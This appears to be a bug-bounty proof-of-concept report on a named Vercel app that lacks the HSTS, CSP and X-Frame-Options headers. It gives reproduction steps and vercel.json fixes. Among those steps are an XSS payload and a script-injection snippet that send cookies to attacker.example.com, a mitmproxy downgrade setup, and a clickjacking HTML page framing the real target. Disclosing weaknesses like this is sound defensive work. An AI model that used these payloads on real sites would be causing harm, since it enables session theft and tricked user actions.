# Missing Security Headers — Proof of Concept

**Target:** manifestoapplucas.vercel.app  
**Severity:** Medium (3 findings)  
**Date:** 2026-03-22  
**Tool:** BugBounty Recon Toolkit v1.2  

---

## Summary

The target is missing three critical HTTP security response headers:
`Strict-Transport-Security`, `Content-Security-Policy`, and `X-Frame-Options`.
These headers are the browser's first line of defense against a class of well-known
client-side attacks. Their absence does not require any server-side vulnerability
to exploit — an attacker only needs to observe that they are missing.

---

## Finding 1 — Missing `Strict-Transport-Security` (HSTS)

### What it is

HSTS instructs the browser to **only ever connect via HTTPS** for a given domain
and duration. Without it, the browser will happily attempt an HTTP connection first
if the user types the domain without a scheme, or follows an HTTP link.

### Reproduction

**Step 1 — Confirm header is absent:**

```bash
curl -si https://manifestoapplucas.vercel.app | grep -i strict
# Expected output: (empty)
```

**Step 2 — Observe the attack surface:**

```bash
curl -si https://manifestoapplucas.vercel.app | grep -i "HTTP/\|strict\|location"
# HTTP/2 403
# No Strict-Transport-Security header present
```

**Step 3 — Simulate a downgrade attack (local network):**

An attacker on the same Wi-Fi network can intercept the initial HTTP request
before it is upgraded to HTTPS using a tool like `mitmproxy`:

```bash
# Attacker machine (same network)
mitmproxy --mode transparent --ssl-insecure

# Victim browser navigates to:
# http://manifestoapplucas.vercel.app  (no https://)
# → intercepted before HTTPS redirect
# → attacker serves modified page
```

Without HSTS, this window exists on every visit until the user explicitly types `https://`.
With HSTS (`max-age=31536000`), the browser refuses HTTP entirely after the first visit.

### Impact

- **SSL stripping attacks** (SSLstrip, Bettercap) become viable on HTTP-capable clients
- **Mixed content** can be injected if any resource loads over HTTP
- **Session cookies** without the `Secure` flag can be stolen over HTTP

### Evidence

```
$ curl -I https://manifestoapplucas.vercel.app 2>/dev/null | grep -i strict
(no output — header absent)
```

### Fix

Add to `vercel.json`:

```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Strict-Transport-Security",
          "value": "max-age=31536000; includeSubDomains; preload"
        }
      ]
    }
  ]
}
```

---

## Finding 2 — Missing `Content-Security-Policy` (CSP)

### What it is

CSP tells the browser which sources are allowed to load scripts, styles, images
and other resources. Without it, any injected `<script>` tag — whether via XSS,
a compromised CDN, or a browser extension — executes with full page privileges.

### Reproduction

**Step 1 — Confirm header is absent:**

```bash
curl -si https://manifestoapplucas.vercel.app | grep -i "content-security"
# Expected output: (empty)
```

**Step 2 — Demonstrate what CSP absence enables:**

Open browser DevTools console on the target page and run:

```javascript
// Without CSP this executes freely
var s = document.createElement('script');
s.src = 'https://attacker.example.com/steal.js';
document.head.appendChild(s);
// steal.js can now read document.cookie, localStorage, keystrokes
```

With a strict CSP (`script-src 'self'`), the browser blocks the load and logs:

```
Refused to load script from 'https://attacker.example.com/steal.js'
because it violates the Content Security Policy directive: "script-src 'self'"
```

**Step 3 — Simulate a stored XSS scenario:**

Assume the app has a user input field that reflects content (dream journal, username).
An attacker submits:

```html
<img src=x onerror="fetch('https://attacker.example.com/steal?c='+document.cookie)">
```

Without CSP: the `onerror` fires, cookies are exfiltrated.  
With CSP `img-src 'self'`: the image load is blocked before `onerror` fires.

### Impact

- **Cross-Site Scripting (XSS)** attacks have no browser-level mitigation
- Injected scripts can steal session tokens, dream journal data, user credentials
- **Clickjacking** via `<iframe>` becomes possible (covered in Finding 3)
- No protection against **CDN compromise** — if a loaded external script is hijacked, the attacker owns the page

### Evidence

```
$ curl -I https://manifestoapplucas.vercel.app 2>/dev/null | grep -i csp
(no output — header absent)

$ curl -I https://manifestoapplucas.vercel.app 2>/dev/null | grep -i content-security
(no output — header absent)
```

### Fix

```json
{
  "key": "Content-Security-Policy",
  "value": "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' https:; connect-src 'self' https:; frame-ancestors 'none'"
}
```

> **Note:** `unsafe-inline` is included above for compatibility with inline styles/scripts
> common in Next.js/React apps. The recommended next step is to replace it with a
> nonce-based CSP once the codebase is audited for inline scripts.

---

## Finding 3 — Missing `X-Frame-Options`

### What it is

`X-Frame-Options` prevents the page from being embedded in an `<iframe>` on
another domain. Without it, an attacker can load the target inside a transparent
overlay on a malicious page and trick users into performing actions they did not
intend — this is called **Clickjacking**.

### Reproduction

**Step 1 — Confirm header is absent:**

```bash
curl -si https://manifestoapplucas.vercel.app | grep -i "x-frame"
# Expected output: (empty)
```

**Step 2 — Embed the target in an iframe (proof):**

Create a file `clickjack_poc.html` and open it in any browser:

```html
<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking PoC — manifestoapplucas.vercel.app</title>
  <style>
    body { margin: 0; background: #fff; font-family: sans-serif; }
    h2 { padding: 20px; color: #c00; }
    .wrapper { position: relative; width: 800px; height: 600px; margin: 0 auto; }
    iframe {
      position: absolute; top: 0; left: 0;
      width: 100%; height: 100%;
      opacity: 0.3;          /* make target semi-transparent */
      border: none;
      pointer-events: none;  /* in real attack: opacity: 0.01, pointer-events: all */
    }
    .decoy {
      position: absolute; top: 200px; left: 300px;
      padding: 14px 28px;
      background: #2563eb; color: white;
      border-radius: 8px; cursor: pointer;
      font-size: 16px; font-weight: bold;
    }
  </style>
</head>
<body>
  <h2>PoC: Target embedded in iframe (opacity 0.3 for visibility)</h2>
  <div class="wrapper">
    <!-- Target page loaded invisibly -->
    <iframe src="https://manifestoapplucas.vercel.app"></iframe>
    <!-- Decoy button positioned over a real button on the target page -->
    <div class="decoy">Win a free prize!</div>
  </div>
  <p style="padding:20px">
    In a real attack: iframe opacity = 0.01 (invisible), pointer-events = all.<br>
    The user clicks "Win a free prize!" but actually clicks the button on the target page.
  </p>
</body>
</html>
```

**Step 3 — Observe the result:**

Open `clickjack_poc.html` in a browser. The target page loads inside the iframe.
If `X-Frame-Options` were set to `DENY`, the browser would refuse to render the
iframe and display an error instead.

**Expected with X-Frame-Options: DENY:**
```
Refused to display 'https://manifestoapplucas.vercel.app' in a frame
because it set 'X-Frame-Options' to 'deny'.
```

**Actual (no header):** Page loads freely in the iframe.

### Impact

- An attacker can trick logged-in users into clicking **"Delete account"**, **"Enable sharing"**,
  or any other button on the target page without their knowledge
- Particularly dangerous for apps with one-click actions (dream journal delete, account settings)
- Can be combined with CSRF for amplified impact

### Evidence

```
$ curl -I https://manifestoapplucas.vercel.app 2>/dev/null | grep -i frame
(no output — header absent)
```

### Fix

```json
{
  "key": "X-Frame-Options",
  "value": "DENY"
}
```

> Note: `frame-ancestors 'none'` in the CSP (Finding 2 fix) covers this as well
> in modern browsers. Setting both provides defense-in-depth for older browsers
> that support `X-Frame-Options` but not CSP `frame-ancestors`.

---

## Complete Fix — `vercel.json`

All three findings are resolved by adding the following to the root `vercel.json`:

```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Strict-Transport-Security",
          "value": "max-age=31536000; includeSubDomains; preload"
        },
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' https:; connect-src 'self' https:; frame-ancestors 'none'"
        },
        {
          "key": "X-Frame-Options",
          "value": "DENY"
        },
        {
          "key": "X-Content-Type-Options",
          "value": "nosniff"
        },
        {
          "key": "Referrer-Policy",
          "value": "strict-origin-when-cross-origin"
        },
        {
          "key": "Permissions-Policy",
          "value": "camera=(), microphone=(), geolocation=()"
        }
      ]
    }
  ]
}
```

**Verify after deploy:**

```bash
curl -si https://manifestoapplucas.vercel.app | grep -iE "strict-transport|content-security|x-frame|x-content-type|referrer|permissions"
```

Expected output after fix:

```
strict-transport-security: max-age=31536000; includeSubDomains; preload
content-security-policy: default-src 'self'; ...
x-frame-options: DENY
x-content-type-options: nosniff
referrer-policy: strict-origin-when-cross-origin
permissions-policy: camera=(), microphone=(), geolocation=()
```

---

## References

- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
- [MDN — Strict-Transport-Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security)
- [MDN — Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
- [MDN — X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)
- [PortSwigger — Clickjacking](https://portswigger.net/web-security/clickjacking)
- [Scott Helme — securityheaders.com](https://securityheaders.com)
